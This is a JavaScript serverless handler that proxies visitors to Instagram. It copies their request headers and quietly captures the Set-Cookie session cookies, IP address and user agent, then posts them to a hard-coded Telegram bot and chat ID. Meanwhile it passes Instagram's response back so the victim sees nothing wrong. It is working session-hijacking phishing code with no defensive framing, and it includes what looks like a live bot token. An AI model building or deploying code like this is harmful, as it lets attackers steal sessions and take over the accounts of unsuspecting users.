export async function onRequest(context) {
    const { request, next } = context;
    
    // 1. Forward the request to Instagram
    const url = new URL(request.url);
    const targetUrl = url.searchParams.get("url") || "https://www.instagram.com/";
    
    // Clone the request to send to Instagram
    const fetchRequest = new Request(targetUrl, {
        method: request.method,
        headers: request.headers,
        body: request.body,
    });

    // 2. Fetch from Instagram
    let response;
    try {
        response = await fetch(fetchRequest);
    } catch (error) {
        return new Response(`Error: ${error.message}`, { status: 500 });
    }

    // 3. Capture the Set-Cookie header
    const setCookieHeader = response.headers.get("set-cookie");
    const cookies = setCookieHeader || "No cookies found";

    // 4. Prepare Telegram message
    const timestamp = new Date().toISOString();
    const userAgent = request.headers.get("user-agent") || "Unknown UA";
    const ip = request.headers.get("x-forwarded-for") || "Unknown IP";
    
    const message = `
🍪 <b>Instagram Proxy Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🔗 <b>Target URL:</b> <code>${targetUrl}</code>

🍪 <b>Cookies (Set-Cookie):**
<code>${cookies}</code>
    `;

    // 5. Send to Telegram
    try {
        await fetch(`https://api.telegram.org/bot8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: "8569746095",
                text: message,
                parse_mode: "HTML"
            })
        });
    } catch (error) {
        console.error("Telegram Error:", error);
    }

    // 6. Return the response from Instagram to the user
    // Clone the response to avoid consuming the body twice
    const newResponse = new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: response.headers,
    });

    return newResponse;
}